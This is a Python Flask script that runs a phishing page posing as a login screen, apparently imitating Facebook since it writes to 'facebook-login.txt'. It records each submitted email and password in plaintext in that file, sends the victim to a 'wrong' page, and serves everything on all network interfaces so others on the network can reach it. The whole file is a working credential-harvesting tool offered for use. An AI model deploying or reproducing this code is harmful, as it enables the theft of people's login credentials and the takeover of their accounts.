from datetime import datetime
import socket
from flask import Flask, render_template, request, redirect, send_from_directory

app = Flask(__name__, template_folder='.')

@app.route('/')
def root():
    return render_template('login.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email', '')
        password = request.form.get('pass', '')
        line = f"{datetime.now():%Y-%m-%d %H:%M:%S}\temail={email}\tpassword={password}\n"
        with open('facebook-login.txt', 'a', encoding='utf-8') as file:
            file.write(line)
        return redirect('/wrong')
    return render_template('login.html')

@app.route('/home')
def home_page():
    return render_template('home.html')

@app.route('/wrong')
def wrong_page():
    return render_template('wrong.html')

@app.route('/<path:filename>')
def static_files(filename):
    return send_from_directory(app.template_folder, filename)


def get_host_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(('8.8.8.8', 80))
            return sock.getsockname()[0]
    except Exception:
        return '127.0.0.1'

if __name__ == '__main__':
    port = 8000
    host = '0.0.0.0'
    actual_ip = get_host_ip()
    print(f'Serving on http://localhost:{port}/')
    print(f'Accessible from same network at http://{actual_ip}:{port}/')
    try:
        from waitress import serve
        serve(app, host=host, port=port)
    except ImportError:
        app.run(host=host, port=port)
